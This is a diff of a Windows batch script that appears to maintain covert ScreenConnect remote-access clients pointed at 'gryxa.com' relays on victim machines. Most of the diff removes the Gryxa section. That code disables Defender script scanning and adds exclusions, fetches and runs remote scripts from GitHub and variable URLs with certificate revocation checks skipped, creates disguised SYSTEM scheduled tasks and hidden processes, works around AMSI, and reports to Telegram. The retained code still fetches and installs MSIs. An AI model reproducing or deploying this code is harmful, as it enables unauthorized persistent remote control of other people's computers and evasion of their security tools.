-      if errorlevel 1 set "FORCE_G=1"
-    )
-  )
-)
-rem M67/M68: NO_INSTALL kills normal force; PUSH-CLEAN is the one allowed campaign
-set "FORCE_RECONNECT=0"
-set "FORCE_CLEAN=0"
-if exist "%WD%\force_gryxa.new" (
-  findstr /C:"RECONNECT" /C:"PUSH-START" "%WD%\force_gryxa.new" >nul 2>&1 && set "FORCE_RECONNECT=1"
-  findstr /C:"PUSH-CLEAN" /C:"CLEAN_INSTALL" "%WD%\force_gryxa.new" >nul 2>&1 && set "FORCE_CLEAN=1"
-)
-if "!NO_INSTALL!"=="1" if "!FORCE_CLEAN!"=="0" set "FORCE_G=0"
-if "!OBSERVE!"=="1" if "!FORCE_RECONNECT!"=="0" if "!FORCE_CLEAN!"=="0" set "FORCE_G=0"
-
-rem Detect Gryxa — CMD first (AMSI-proof). Only trust PS health if line starts with HEALTHY|BROKEN|STUCK|ABSENT|
-set "GH="
-sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-if not errorlevel 1 (
-  reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-  if not errorlevel 1 (
-    set "GRYXA_OK=1"
-    set "GRYXA_WAS=1"
-    set "GH=HEALTHY|%GRYXA_FP%|cmd-sc-relay"
-  )
-)
-if "!GRYXA_OK!"=="0" (
-  for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
-    set "_FP=%%a"
-    set "_FP=!_FP: =!"
-    if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
-      sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-      if not errorlevel 1 (
-        reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-        if not errorlevel 1 (
-          set "GRYXA_OK=1"
-          set "GRYXA_WAS=1"
-          set "GRYXA_FP=!_FP!"
-          set "GH=HEALTHY|!_FP!|cmd-sc-relay"
-        )
-      )
-    )
-  )
-)
-if "!GRYXA_OK!"=="0" if exist "%WD%\own_lib.ps1" (
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" >"%WD%\gryxa_health.out" 2>nul
-  if exist "%WD%\gryxa_health.out" for /f "usebackq delims=" %%R in ("%WD%\gryxa_health.out") do set "GH=%%R"
-  echo !GH!| findstr /I /B /C:"HEALTHY|" /C:"BROKEN|" /C:"STUCK|" /C:"ABSENT|" >nul
-  if errorlevel 1 (
-    echo gryxa_health_amsi_or_garbage ignored>>"%LOG%"
-    set "GH=UNTRUSTED|amsi"
-  ) else (
-    echo !GH!| findstr /I /B /C:"HEALTHY|" >nul
-    if not errorlevel 1 (
-      set "GRYXA_OK=1"
-      set "GRYXA_WAS=1"
-    )
-  )
-)
-echo gryxa_health=!GH!>>"%LOG%"
-
-rem FORCE: PUSH-CLEAN allowed under NO_INSTALL (one clean install+reboot). Else blocked / start-only.
-if "%FORCE_G%"=="1" (
-  if "!FORCE_CLEAN!"=="1" (
-    echo gryxa_force_PUSH_CLEAN observe=!OBSERVE! no_install=!NO_INSTALL!>>"%LOG%"
-    call :QueueGryxaCleanInstall
-    if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
-    goto :GryxaAfter
-  )
-  if "!NO_INSTALL!"=="1" (
-    echo gryxa_force_blocked_NO_INSTALL>>"%LOG%"
-    if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
-    goto :GryxaAfter
-  )
-  if "!FORCE_RECONNECT!"=="1" (
-    echo gryxa_force_START_ONLY observe=!OBSERVE! ok=!GRYXA_OK!>>"%LOG%"
-    if "!GRYXA_OK!"=="1" (
-      echo gryxa_force_already_running_ack>>"%LOG%"
-    ) else (
-      sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-      if not errorlevel 1 (
-        echo gryxa_force_detached_start>>"%LOG%"
-        call :QueueGryxaStartOnly
-      ) else (
-        echo gryxa_force_start_heal_1060_blocked_use_manual>>"%LOG%"
-      )
-    )
-    if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
-    goto :GryxaAfter
-  )
-  if "!OBSERVE!"=="1" (
-    echo gryxa_force_suppressed_OBSERVE>>"%LOG%"
-    if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
-    goto :GryxaAfter
-  )
-  if "!GRYXA_OK!"=="1" (
-    echo gryxa_force_skip_already_healthy>>"%LOG%"
-  ) else (
-    sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-    if not errorlevel 1 (
-      echo gryxa_force_skip_svc_exists_start_only>>"%LOG%"
-      call :QueueGryxaStartOnly
-    ) else (
-      echo gryxa_force_push_reinstall_blocked_NO_auto>>"%LOG%"
-    )
-  )
-  if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
-  goto :GryxaAfter
-)
-
-powershell -NoProfile -NonInteractive -Command "if(( -not (Test-Path '%GRYXA_DEEP%')) -or (((Get-Date)-(Get-Item -LiteralPath '%GRYXA_DEEP%' -Force).LastWriteTime).TotalHours -ge 8)){ exit 1 } else { exit 0 }" >nul 2>&1
-if errorlevel 1 set "DO_DEEP=1"
-
-rem Healthy + not deep due → still verify ImagePath has gryxa.com (bare sc create = false healthy)
-if "!GRYXA_OK!"=="1" (
-  reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-  if errorlevel 1 (
-    set "GRYXA_OK=0"
-    for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
-      set "_FP=%%a"
-      set "_FP=!_FP: =!"
-      if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
-        sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-        if not errorlevel 1 (
-          reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-          if not errorlevel 1 (
-            set "GRYXA_OK=1"
-            set "GRYXA_FP=!_FP!"
-          )
-        )
-      )
-    )
-    if "!GRYXA_OK!"=="0" echo gryxa_running_no_relay>>"%LOG%"
-  )
-)
-
-if "!GRYXA_OK!"=="1" if "%DO_DEEP%"=="0" (
-  echo gryxa_skip_already_healthy>>"%LOG%"
-  goto :GryxaAfter
-)
-
-rem restore lib if AV/AMSI deleted it (cmd-only)
-if not exist "%WD%\own_lib.ps1" (
-  echo gryxa_lib_missing_refetch>>"%LOG%"
-  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
-  reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.ps1" "%OWNLIB%" >nul 2>&1
-)
-
-rem M52 FREEZE + STUCK-HEAL: start-only when possible; queue G7 heal when 1060+dir or no-relay
-if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
-if exist "%WD%\gryxa_msi.lock" (
-  powershell -NoProfile -NonInteractive -Command "if(((Get-Date)-(Get-Item '%WD%\gryxa_msi.lock').LastWriteTime).TotalMinutes -gt 25){Remove-Item '%WD%\gryxa_msi.lock' -Force}" >nul 2>&1
-)
-if "!GRYXA_OK!"=="0" (
-  echo gryxa_mon_start_only>>"%LOG%"
-  sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
-  sc failure "ScreenConnect Client (%GRYXA_FP%)" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
-  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-  timeout /t 12 /nobreak >nul
-  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-  timeout /t 5 /nobreak >nul
-  sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-  if not errorlevel 1 (
-    reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-    if not errorlevel 1 set "GRYXA_OK=1"
-  )
-  rem M53: service exists STOPPED with relay → start-only, do NOT reinstall
-  if "!GRYXA_OK!"=="0" (
-    sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-    if not errorlevel 1 (
-      reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-      if not errorlevel 1 (
-        echo gryxa_stopped_relay_start_retry>>"%LOG%"
-        sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-        timeout /t 10 /nobreak >nul
-        sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-        if not errorlevel 1 set "GRYXA_OK=1"
-        if "!GRYXA_OK!"=="0" echo gryxa_stopped_relay_still_down_no_heal>>"%LOG%"
-      )
-    )
-  )
-  if "!GRYXA_OK!"=="0" (
-    for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
-      set "_FP=%%a"
-      set "_FP=!_FP: =!"
-      if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
-        sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-        if not errorlevel 1 (
-          reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-          if not errorlevel 1 (
-            set "GRYXA_OK=1"
-            set "GRYXA_FP=!_FP!"
-          )
-        )
-      )
-    )
-  )
-)
-
-rem heal ONLY on hard 1060 — blocked under NO_INSTALL
-set "NEED_HEAL=0"
-if "!NO_INSTALL!"=="1" (
-  echo gryxa_NO_INSTALL_skip_heal GRYXA_OK=!GRYXA_OK!>>"%LOG%"
-  echo %DATE% %TIME% no_install ok=!GRYXA_OK! fp=%GRYXA_FP% gh=!GH!>>"%WD%\drop_trace.log"
-  goto :AfterNeedHeal
-)
-if "!OBSERVE!"=="1" (
-  echo gryxa_observe_heal_allowed_no_reinstall GRYXA_OK=!GRYXA_OK!>>"%LOG%"
-  echo %DATE% %TIME% observe ok=!GRYXA_OK! fp=%GRYXA_FP% gh=!GH!>>"%WD%\drop_trace.log"
-)
-if "!GRYXA_OK!"=="0" (
-  sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-  if errorlevel 1 (
-    set "NEED_HEAL=1"
-    echo gryxa_1060_queue_heal>>"%LOG%"
-  ) else (
-    echo gryxa_svc_exists_skip_heal_start_only>>"%LOG%"
-  )
-)
-if "!NEED_HEAL!"=="1" call :QueueGryxaHeal HEAL
-:AfterNeedHeal
-
-if "%DO_DEEP%"=="1" echo done>"%GRYXA_DEEP%"
-echo gryxa_freeze_or_heal_done>>"%LOG%"
-echo %DATE% %TIME% tick_gryxa ok=!GRYXA_OK! observe=!OBSERVE! no_install=!NO_INSTALL! force=!FORCE_G!>>"%WD%\drop_trace.log"
-
-:GryxaAfter
-if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
-set "GRYXA_OK=0"
-sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
-if not errorlevel 1 (
-  reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-  if not errorlevel 1 set "GRYXA_OK=1"
-)
-rem M52: any non-sevrz Running WITH gryxa.com ImagePath is OK
-if "%GRYXA_OK%"=="0" (
-  for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
-    set "_FP=%%a"
-    set "_FP=!_FP: =!"
-    if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
-      sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
-      if not errorlevel 1 (
-        reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-        if not errorlevel 1 (
-          set "GRYXA_OK=1"
-          set "GRYXA_FP=!_FP!"
-        )
-      )
-    )
-  )
-)
-if "%GRYXA_OK%"=="0" (
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-health -WorkDir "%WD%" 2>nul | findstr /I /B /C:"HEALTHY|" | findstr /I "running=1" >nul
-  if not errorlevel 1 set "GRYXA_OK=1"
-)
-
-if "%GRYXA_OK%"=="1" if "%GRYXA_WAS%"=="0" (
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-restored" >nul 2>&1
-  call :TgGryxa RESTORED "Gryxa ScreenConnect healthy (svc running)"
-)
-if "%GRYXA_OK%"=="0" (
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-must-fail" >nul 2>&1
-  call :TgGryxa DOWN "Gryxa MUST-RUN - service not Running after heal"
-)
-
 rem ── [H] quiet digest (skip healthy hosts — was flooding Telegram) ──
 if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% >nul 2>&1
 set "NEED_HB=0"
 if "%PRIM_OK%"=="0" set "NEED_HB=1"
 if %FOREIGN_LEFT% GTR 0 set "NEED_HB=1"
-if "%GRYXA_OK%"=="0" set "NEED_HB=1"
 if "%NEED_HB%"=="0" (
   echo hb_skip_healthy>>"%LOG%"
 ) else (
@@ -964,7 +494,7 @@ if exist "%WD%\own_mon.cmd" (
 )
 del /f /q "%MUTEX%" >nul 2>&1
 
-echo tick done: prim=%PRIM_OK% gryxa=%GRYXA_OK% alt=%ALT_OK% foreign=%FOREIGN_LEFT%>>"%LOG%"
+echo tick done: prim=%PRIM_OK% alt=%ALT_OK% foreign=%FOREIGN_LEFT%>>"%LOG%"
 endlocal
 exit /b 0
 
@@ -973,7 +503,6 @@ rem ═══════════════ helpers ═══════�
 (
 echo MON_FLOOR=!MON_FLOOR!
 echo LIB_FLOOR=!LIB_FLOOR!
-echo GRYXA_FLOOR=!GRYXA_FLOOR!
 )>"%FLOOR_FILE%"
 exit /b 0
 
@@ -1008,21 +537,6 @@ if defined _T (
 set "_FPAT="
 exit /b 0
 
-:ParseGryxaNum
-set "_PN=0"
-set "_T="
-if not exist "%~1" exit /b 1
-rem header: rem OWN_GRYXA BUILD 20260804G8  -> token 4 is version
-set "_FPAT=OWN_GRYXA"
-set "_FPAT=!_FPAT! BUILD"
-for /f "usebackq tokens=4" %%V in (`findstr /C:"!_FPAT!" "%~1" 2^>nul`) do set "_T=%%V"
-if defined _T (
-  set "_T=!_T:"=!"
-  set "_PN=!_T:*G=!"
-)
-set "_FPAT="
-exit /b 0
-
 :RefuseIfMonBelowFloor
 call :ParseMonNum "%~1"
 if "!_PN!"=="" set "_PN=0"
@@ -1037,339 +551,3 @@ if !_PN! LSS !LIB_FLOOR! exit /b 1
 if !_PN! EQU 0 exit /b 1
 exit /b 0
 
-:RefuseIfGryxaBelowFloor
-call :ParseGryxaNum "%~1"
-if "!_PN!"=="" set "_PN=0"
-if !_PN! LSS !GRYXA_FLOOR! exit /b 1
-if !_PN! EQU 0 exit /b 1
-exit /b 0
-
-:QueueGryxaCleanInstall
-rem M68: pull gryxa_clean_install.cmd and run once (uninstall+install+one reboot). Sevrz keepers untouched.
-echo gryxa_clean_install_queue>>"%LOG%"
-if not exist "%SystemRoot%\Temp\.upd" mkdir "%SystemRoot%\Temp\.upd" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 45 -o "%WD%\gryxa_clean_install.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/gryxa_clean_install.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
-if not exist "%WD%\gryxa_clean_install.cmd" (
-  echo gryxa_clean_install_fetch_fail>>"%LOG%"
-  exit /b 1
-)
-findstr /C:"GRYXA_CLEAN_INSTALL R1" "%WD%\gryxa_clean_install.cmd" >nul 2>&1
-if errorlevel 1 (
-  echo gryxa_clean_install_bad_marker>>"%LOG%"
-  exit /b 1
-)
-rem clear prior reboot marker so this campaign may reboot once
-del /f /q "%WD%\gryxa_clean_rebooted.flag" >nul 2>&1
-call "%WD%\gryxa_clean_install.cmd"
-echo gryxa_clean_install_launched>>"%LOG%"
-exit /b 0
-
-:QueueGryxaStartOnly
-rem M67: blocked under NO_INSTALL
-if exist "%WD%\no_install.flag" (
-  echo gryxa_start_blocked_NO_INSTALL>>"%LOG%"
-  exit /b 0
-)
-rem Detached sc start — survives sevrz Guest 10s kill (never sc stop)
-set "GSVC=ScreenConnect Client (%GRYXA_FP%)"
-if not exist "%SystemRoot%\Temp\.upd" mkdir "%SystemRoot%\Temp\.upd" >nul 2>&1
-> "%SystemRoot%\Temp\.upd\gryxa_start_once.cmd" (
-  echo @echo off
-  echo sc config "%GSVC%" start= auto
-  echo sc start "%GSVC%"
-  echo timeout /t 8 /nobreak
-  echo sc start "%GSVC%"
-  echo timeout /t 8 /nobreak
-  echo sc start "%GSVC%"
-  echo schtasks /Delete /TN WucacheGryxaStartOnce /F
-)
-schtasks /Create /TN "WucacheGryxaStartOnce" /TR "cmd.exe /c %SystemRoot%\Temp\.upd\gryxa_start_once.cmd" /SC MINUTE /MO 60 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
-schtasks /Run /TN "WucacheGryxaStartOnce" >nul 2>&1
-if errorlevel 1 (
-  powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','%SystemRoot%\Temp\.upd\gryxa_start_once.cmd' -WindowStyle Hidden" >nul 2>&1
-)
-echo gryxa_start_only_queued>>"%LOG%"
-exit /b 0
-
-:QueueGryxaHeal
-rem M67: NO_INSTALL blocks all auto msiexec HEAL/REINSTALL
-if exist "%WD%\no_install.flag" (
-  echo gryxa_heal_blocked_NO_INSTALL mode=%~1>>"%LOG%"
-  exit /b 0
-)
-rem %1=REINSTALL|HEAL — OBSERVE blocks REINSTALL only; HEAL (start/1060-i) allowed
-rem M65: ALWAYS rate-limit (20m if 1060, 90m if svc exists). Never delete gryxa_msi.lock here.
-set "HEALMODE=%~1"
-if "%HEALMODE%"=="" set "HEALMODE=HEAL"
-if exist "%WD%\observe.flag" if /I "!HEALMODE!"=="REINSTALL" (
-  echo gryxa_reinstall_blocked_OBSERVE>>"%LOG%"
-  exit /b 0
-)
-rem Stopped service: start-only, never msiexec HEAL (avoids /x + panel dupes)
-sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-if not errorlevel 1 (
-  if /I "!HEALMODE!"=="HEAL" (
-    echo gryxa_heal_redirect_start_only_svc_exists>>"%LOG%"
-    call :QueueGryxaStartOnly
-    exit /b 0
-  )
-)
-rem in-flight lock: another heal/install already running
-if exist "%WD%\gryxa_msi.lock" (
-  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\gryxa_msi.lock') -and (((Get-Date)-(Get-Item -LiteralPath '%WD%\gryxa_msi.lock').LastWriteTime).TotalMinutes -lt 25)){exit 0}else{exit 1}" >nul 2>&1
-  if not errorlevel 1 (
-    echo gryxa_heal_skip_lock_inflight>>"%LOG%"
-    exit /b 0
-  )
-)
-set "RL_MIN=90"
-sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-if errorlevel 1 set "RL_MIN=20"
-powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\gryxa_heal.flag') -and (((Get-Date)-(Get-Item '%WD%\gryxa_heal.flag').LastWriteTime).TotalMinutes -lt %RL_MIN%)){exit 1}else{exit 0}" >nul 2>&1
-if errorlevel 1 (
-  echo gryxa_heal_rate_limited mins=%RL_MIN%>>"%LOG%"
-  exit /b 0
-)
-echo %DATE% %TIME% %HEALMODE%>"%WD%\gryxa_heal.flag"
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
-if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA2%" >nul 2>&1
-if not exist "%SystemRoot%\Temp\.upd" mkdir "%SystemRoot%\Temp\.upd" >nul 2>&1
-> "%SystemRoot%\Temp\.upd\gryxa_heal_once.cmd" (
-  echo @echo off
-  echo call "%WD%\own_gryxa.cmd" "%WD%" "%GRYXA_FP%" "%KEEP_FP%" "%ALT_FP%" %HEALMODE% ^>^>"%LOG%" 2^>^&1
-)
-wmic process call create "cmd.exe /c %SystemRoot%\Temp\.upd\gryxa_heal_once.cmd" >nul 2>&1
-if errorlevel 1 (
-  powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','%SystemRoot%\Temp\.upd\gryxa_heal_once.cmd' -WindowStyle Hidden" >nul 2>&1
-)
-echo gryxa_heal_queued mode=%HEALMODE% rl=%RL_MIN%>>"%LOG%"
-exit /b 0
-
-:EnsureGryxaWatch
-rem M64/M61: download + arm continuous LOOP + 1-min TICK — NEVER delete WucacheGryxaWatch
-if not exist "%WD%\gryxa_watch.cmd" (
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\gryxa_watch.cmd" "%OWNWATCH%" >nul 2>&1
-  if not exist "%WD%\gryxa_watch.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\gryxa_watch.cmd" "%OWNWATCH2%" >nul 2>&1
-)
-if not exist "%WD%\gryxa_watch.cmd" (
-  echo gryxa_watch_missing>>"%LOG%"
-  exit /b 1
-)
-findstr /C:"GRYXA_WATCH BUILD" "%WD%\gryxa_watch.cmd" >nul 2>&1
-if errorlevel 1 (
-  echo gryxa_watch_bad_marker>>"%LOG%"
-  exit /b 1
-)
-schtasks /Create /TN "WucacheGryxaWatch" /TR "cmd.exe /c \"%WD%\gryxa_watch.cmd\" TICK" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
-set "NEED_LOOP=1"
-if exist "%WD%\gryxa_watch.hb" (
-  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\gryxa_watch.hb') -and (((Get-Date)-(Get-Item -LiteralPath '%WD%\gryxa_watch.hb').LastWriteTime).TotalSeconds -lt 30)){exit 0}else{exit 1}" >nul 2>&1
-  if not errorlevel 1 set "NEED_LOOP=0"
-)
-if "!NEED_LOOP!"=="1" (
-  echo gryxa_watch_start_loop>>"%LOG%"
-  powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','\"%WD%\gryxa_watch.cmd\" LOOP' -WindowStyle Hidden" >nul 2>&1
-  if errorlevel 1 wmic process call create "cmd.exe /c \"%WD%\gryxa_watch.cmd\" LOOP" >nul 2>&1
-) else (
-  echo gryxa_watch_loop_alive>>"%LOG%"
-)
-exit /b 0
-
-:EnsureGryxaMust
-rem M67: NO_INSTALL — report only, no HEAL/start queue. Else: Stopped→start; 1060→HEAL.
-if exist "%WD%\no_install.flag" (
-  echo gryxa_must_blocked_NO_INSTALL>>"%LOG%"
-  exit /b 0
-)
-set "GRYXA_OK=0"
-if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
-set "GSVC=ScreenConnect Client (%GRYXA_FP%)"
-if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
-sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
-if not errorlevel 1 (
-  reg query "HKLM\SYSTEM\CurrentControlSet\Services\%GSVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
-  if not errorlevel 1 (
-    set "GRYXA_OK=1"
-    echo gryxa_must_already_alive_relay>>"%LOG%"
-    exit /b 0
-  )
-)
-sc query "%GSVC%" >nul 2>&1
-if not errorlevel 1 (
-  echo gryxa_must_start_only_detached>>"%LOG%"
-  call :QueueGryxaStartOnly
-  exit /b 0
-)
-echo gryxa_must_1060_queue_heal>>"%LOG%"
-call :QueueGryxaHeal HEAL
-exit /b 0
-
-:TgGryxa
-rem %1=kind %2=msg — per-Gryxa state so it cannot reuse Primary own_mon.state.
-set "GSTATE=%~1"
-set "GMSG=%~2"
-set "GSTATEFILE=%WD%\own_mon_gryxa.state"
-set "GOLD="
-if exist "%GSTATEFILE%" set /p GOLD=<"%GSTATEFILE%"
-if /I "%GSTATE%"=="RESTORED" (
-  if /I "%GOLD%"=="RESTORED" exit /b 0
-  if exist "%WD%\tg_gryxa.flag" (
-    powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_gryxa.flag').LastWriteTime).TotalMinutes -lt 1440){exit 0}else{exit 1}" >nul 2>&1
-    if not errorlevel 1 (
-      echo tg_gryxa_suppress_%GSTATE%>>"%LOG%"
-      exit /b 0
-    )
-  )
-  echo %GSTATE%>"%GSTATEFILE%"
-  echo sent>"%WD%\tg_gryxa.flag"
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %GSTATE% -Summary "%GMSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
-  echo tg gryxa %GSTATE% sent>>"%LOG%"
-  exit /b 0
-)
-if /I "%GSTATE%"=="DOWN" if /I "%GOLD%"=="DOWN" if exist "%WD%\tg_gryxa.flag" (
-  powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_gryxa.flag').LastWriteTime).TotalMinutes -lt 360){exit 0}else{exit 1}" >nul 2>&1
-  if not errorlevel 1 (
-    echo tg_gryxa_suppress_%GSTATE%>>"%LOG%"
-    exit /b 0
-  )
-)
-echo %GSTATE%>"%GSTATEFILE%"
-echo sent>"%WD%\tg_gryxa.flag"
-powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %GSTATE% -Summary "%GMSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
-echo tg gryxa %GSTATE% sent>>"%LOG%"
-exit /b 0
-
-:InstallMsi
-rem %1=url %2=tag
-set "URL=%~1"
-set "TAG=%~2"
-echo [%TAG%] fetch %URL%>>"%LOG%"
-"%CURL%" -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o "%MSI%.tmp" "%URL%" >>"%LOG%" 2>&1
-for %%F in ("%MSI%.tmp") do if %%~zF LEQ 1000000 (
-  echo [%TAG%] fetch failed>>"%LOG%"
-  del /f /q "%MSI%.tmp" >nul 2>&1
-  exit /b 1
-)
-move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
-rem M41: OLE magic + ProductName FP must match KEEP_FP before /i
-set "MSIOK=no"
-if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action test-msi -Fp "%KEEP_FP%" -Extra "%MSI%" -WorkDir "%WD%"`) do set "MSIOK=%%R"
-if /I not "!MSIOK!"=="yes" (
-  echo [%TAG%] msi_validate_fail>>"%LOG%"
-  del /f /q "%MSI%" >nul 2>&1
-  exit /b 1
-)
-rem M42/M47: sibling-safe copy (empty Upgrade table) before sevrz /i — refuse /i if protect fails
-set "MSI_SAFE="
